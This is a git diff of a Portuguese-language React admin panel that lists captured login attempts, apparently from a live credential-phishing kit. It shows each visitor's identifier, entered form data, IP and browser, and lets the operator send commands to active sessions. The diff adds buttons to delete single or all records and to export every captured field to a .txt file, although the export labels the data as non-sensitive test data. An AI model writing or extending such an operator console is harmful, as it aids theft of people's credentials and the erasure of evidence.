@@ -2,6 +2,7 @@ import { useEffect, useState, type FormEvent } from 'react';
 import {
   Activity,
   ArrowRight,
+  Download,
   Eye,
   EyeOff,
   LayoutDashboard,
@@ -10,6 +11,7 @@ import {
   LogOut,
   Settings,
   ShieldCheck,
+  Trash2,
   User,
   Users,
 } from 'lucide-react';
@@ -508,37 +510,59 @@ function SessionBlock({
   expanded,
   onToggle,
   onCommand,
+  onDelete,
   onHistory,
 }: {
   session: LoginSession;
   expanded: boolean;
   onToggle: () => void;
   onCommand: (id: string, command: string) => void;
+  onDelete: (id: string) => void;
   onHistory: () => void;
 }) {
   const ended = session.status === 'ended';
 
   return (
     <div className={`donas-session${ended ? ' is-ended' : ''}`} data-testid="session-block">
-      <button type="button" className="donas-session-head" onClick={onToggle} data-testid="session-head">
-        <span className={`donas-flow-badge donas-flow-badge--${session.flowType ?? 'NA'}`}>
-          {session.flowType ?? '?'}
-        </span>
-        <span className="donas-session-title">
-          <strong>{session.identifier || `Sessão ${session.sessionId.slice(0, 8)}`}</strong>
-          <small>{stageLabel(session.currentStep)}</small>
-        </span>
-        <span className="donas-session-tags">
-          <span className={`donas-status donas-status--${ended ? 'failed' : 'submitted'}`}>
-            {ended ? 'encerrada' : 'ativa'}
+      <div className="donas-session-headwrap">
+        <button type="button" className="donas-session-head" onClick={onToggle} data-testid="session-head">
+          <span className={`donas-flow-badge donas-flow-badge--${session.flowType ?? 'NA'}`}>
+            {session.flowType ?? '?'}
           </span>
-          <span className="donas-tag">{DIRECTIVE_LABELS[session.directive] ?? session.directive}</span>
-        </span>
-        <span className="donas-session-meta">
-          {session.browser} · {session.os} · {session.ip} · {timeAgo(session.updatedAt)}
-        </span>
-        <span className="donas-session-chevron">{expanded ? '▾' : '▸'}</span>
-      </button>
+          <span className="donas-session-title">
+            <strong>{session.identifier || `Sessão ${session.sessionId.slice(0, 8)}`}</strong>
+            <small>{stageLabel(session.currentStep)}</small>
+          </span>
+          <span className="donas-session-tags">
+            <span className={`donas-status donas-status--${ended ? 'failed' : 'submitted'}`}>
+              {ended ? 'encerrada' : 'ativa'}
+            </span>
+            <span className="donas-tag">{DIRECTIVE_LABELS[session.directive] ?? session.directive}</span>
+          </span>
+          <span className="donas-session-meta">
+            {session.browser} · {session.os} · {session.ip} · {timeAgo(session.updatedAt)}
+          </span>
+          <span className="donas-session-chevron">{expanded ? '▾' : '▸'}</span>
+        </button>
+        <button
+          type="button"
+          className="donas-session-trash"
+          aria-label="Excluir esta tentativa"
+          title="Excluir permanentemente esta tentativa"
+          onClick={() => {
+            if (
+              window.confirm(
+                'Excluir permanentemente esta tentativa? Esta ação não pode ser desfeita.',
+              )
+            ) {
+              onDelete(session.id);
+            }
+          }}
+          data-testid="session-delete"
+        >
+          <Trash2 size={16} />
+        </button>
+      </div>
 
       {expanded && (
         <div className="donas-session-body" data-testid="session-body">
@@ -620,6 +644,7 @@ function TentativasView() {
   const [q, setQ] = useState('');
   const [expandedId, setExpandedId] = useState<string | null>(null);
   const [historyFor, setHistoryFor] = useState<LoginSession | null>(null);
+  const [confirmAll, setConfirmAll] = useState(false);
 
   const load = () =>
     fetch('/api/auth-attempt/list', { headers: authHeaders() })
@@ -644,6 +669,65 @@ function TentativasView() {
     load();
   };
 
+  const deleteOne = async (id: string) => {
+    await fetch(`/api/auth-attempt/${id}`, {
+      method: 'DELETE',
+      headers: { ...authHeaders() },
+    }).catch(() => {});
+    load();
+  };
+
+  const deleteAll = async () => {
+    await fetch('/api/auth-attempt', {
+      method: 'DELETE',
+      headers: { ...authHeaders() },
+    }).catch(() => {});
+    setConfirmAll(false);
+    load();
+  };
+
+  const downloadTxt = () => {
+    const pad = (n: number) => String(n).padStart(2, '0');
+    const dt = (v: string) => (v ? new Date(v).toLocaleString('pt-BR') : '-');
+    const lines: string[] = [];
+    lines.push('TENTATIVAS DE LOGIN — DADOS DE TESTE (não sensíveis)');
+    lines.push(`Gerado em: ${new Date().toLocaleString('pt-BR')}`);
+    lines.push(`Total de tentativas: ${items.length}`);
+    lines.push('');
+    items.forEach((s, i) => {
+      const fields = collectFields(s);
+      lines.push('========================================');
+      lines.push(`TENTATIVA ${i + 1}/${items.length}`);
+      lines.push('========================================');
+      lines.push(`Fluxo: ${flowLabel(s.flowType)} (${s.flowType ?? '?'})`);
+      lines.push(`Identificador: ${s.identifier ?? '-'}`);
+      lines.push(`ID da sessão: ${s.sessionId}`);
+      lines.push(`Etapa atual: ${stageLabel(s.currentStep)}`);
+      lines.push(`Status: ${s.status === 'ended' ? 'encerrada' : 'ativa'}`);
+      lines.push(`Estado: ${DIRECTIVE_LABELS[s.directive] ?? s.directive}`);
+      lines.push('Dados preenchidos:');
+      if (fields.length) fields.forEach((f) => lines.push(`  - ${f.label}: ${f.value}`));
+      else lines.push('  - (nenhum)');
+      lines.push(`IP: ${s.ip ?? '-'}`);
+      lines.push(`Navegador: ${s.browser ?? '-'}`);
+      lines.push(`Sistema: ${s.os ?? '-'}`);
+      lines.push(`Criado em: ${dt(s.createdAt)}`);
+      lines.push(`Atualizado em: ${dt(s.updatedAt)}`);
+      lines.push('');
+    });
+    const blob = new Blob([lines.join('\n')], { type: 'text/plain;charset=utf-8' });
+    const url = URL.createObjectURL(blob);
+    const now = new Date();
+    const name = `tentativas-${now.getFullYear()}${pad(now.getMonth() + 1)}${pad(now.getDate())}-${pad(now.getHours())}${pad(now.getMinutes())}.txt`;
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = name;
+    document.body.appendChild(a);
+    a.click();
+    a.remove();
+    URL.revokeObjectURL(url);
+  };
+
   const term = q.trim().toLowerCase();
   const filtered = term
     ? items.filter((s) =>
@@ -662,6 +746,24 @@ function TentativasView() {
           data-testid="tentativas-search"
         />
         <span className="donas-mini-btn" style={{ cursor: 'default' }}>{filtered.length} sessões</span>
+        <button
+          type="button"
+          className="donas-tool-btn"
+          onClick={downloadTxt}
+          disabled={items.length === 0}
+          data-testid="tentativas-download"
+        >
+          <Download size={15} /> Baixar dados (.txt)
+        </button>
+        <button
+          type="button"
+          className="donas-tool-btn donas-tool-btn--danger"
+          onClick={() => setConfirmAll(true)}
+          disabled={items.length === 0}
+          data-testid="tentativas-delete-all"
+        >
+          <Trash2 size={15} /> Apagar todas
+        </button>
       </div>
 
       <div className="donas-sessions" data-testid="sessions-list">
@@ -672,6 +774,7 @@ function TentativasView() {
             expanded={expandedId === s.id}
             onToggle={() => setExpandedId(expandedId === s.id ? null : s.id)}
             onCommand={sendCommand}
+            onDelete={deleteOne}
             onHistory={() => setHistoryFor(s)}
           />
         ))}
@@ -689,6 +792,41 @@ function TentativasView() {
           session={items.find((s) => s.id === historyFor.id) ?? historyFor}
           onClose={() => setHistoryFor(null)}
         />
+      )}
+
+      {confirmAll && (
+        <div className="donas-modal-backdrop" onClick={() => setConfirmAll(false)} data-testid="delete-all-modal">
+          <div className="donas-modal" onClick={(e) => e.stopPropagation()}>
+            <div className="donas-modal-head">
+              <h3>● Apagar todas as tentativas</h3>
+              <button type="button" onClick={() => setConfirmAll(false)} aria-label="Fechar">×</button>
+            </div>
+            <div className="donas-modal-body" style={{ display: 'block' }}>
+              <p className="donas-sms-help">
+                Esta ação vai <b>excluir permanentemente TODAS</b> as {items.length} tentativas
+                registradas no banco de dados. Esta operação <b>não pode ser desfeita</b>.
+              </p>
+            </div>
+            <div className="donas-modal-foot" style={{ gap: 10 }}>
+              <button
+                type="button"
+                className="donas-tool-btn"
+                onClick={() => setConfirmAll(false)}
+                data-testid="delete-all-cancel"
+              >
+                Cancelar
+              </button>
+              <button
+                type="button"
+                className="donas-tool-btn donas-tool-btn--danger"
+                onClick={deleteAll}
+                data-testid="delete-all-confirm"
+              >
+                Apagar todas permanentemente
+              </button>
+            </div>
+          </div>
+        </div>
       )}
     </div>
   );
